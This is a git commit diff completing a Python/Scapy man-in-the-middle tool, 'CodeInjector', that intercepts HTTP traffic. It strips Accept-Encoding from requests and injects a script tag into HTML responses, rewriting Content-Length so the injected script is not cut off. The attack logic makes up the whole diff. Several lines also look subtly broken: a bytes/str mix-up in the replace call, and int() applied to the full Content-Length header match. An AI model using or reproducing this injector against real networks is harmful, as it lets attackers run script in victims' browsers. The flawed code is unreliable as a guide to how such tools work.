5ba10729d4b1602aef0a7f4957d2601fd1dfe7e4
Tut-k0 <Tut_k0@protonmail.com>
2022-02-13 14:28:11 -0600

    Finishing inject.py

--- CodeInjector/inject.py
+++ CodeInjector/inject.py
@@ -16,15 +16,27 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet = IP(packet.get_payload())  # Transform raw packet to scapy.
     if scapy_packet.haslayer(Raw):  # Checking if a packet has a Raw response on the TCP layer.
-        if scapy_packet[TCP].dport == 80:  # dport is incoming
-            print("HTTP Request")
-            # Replacing encoding to see raw html.
-            mod_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[Raw].load)
-            new_packet = set_load(scapy_packet, mod_load)
-            packet.set_payload(bytes(new_packet))
-        elif scapy_packet[TCP].sport == 80:  # sport is outgoing
-            print("HTTP Response")
-            modified_load = scapy_packet[Raw].load.replace()
+        try:
+            load = scapy_packet[Raw].load.decode()
+            if scapy_packet[TCP].dport == 80:  # dport is incoming
+                print("HTTP Request")
+                # Replacing encoding to see raw html.
+                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+            elif scapy_packet[TCP].sport == 80:  # sport is outgoing
+                print("HTTP Response")
+                injection_code = "<script>alert('test');</script>"
+                load = scapy_packet[Raw].load.replace("</body>", f"{injection_code}</body>")
+                content_length_search = re.search(r"Content-Length:\s(\d*)", load)
+                # Modify content length on return to insure our code isn't cutoff from running.
+                if content_length_search and "text/html" in load:
+                    content_length = content_length_search.group(0)  # First match just the digits.
+                    new_content_length = int(content_length) + len(injection_code)
+                    load = load.replace(content_length, str(new_content_length))
+            if load != scapy_packet[Raw].load:
+                new_packet = set_load(scapy_packet, load)
+                packet.set_payload(bytes(new_packet))
+        except UnicodeDecodeError:  # We don't care about packets we can't unicode decode.
+            pass
 
     packet.accept()
 
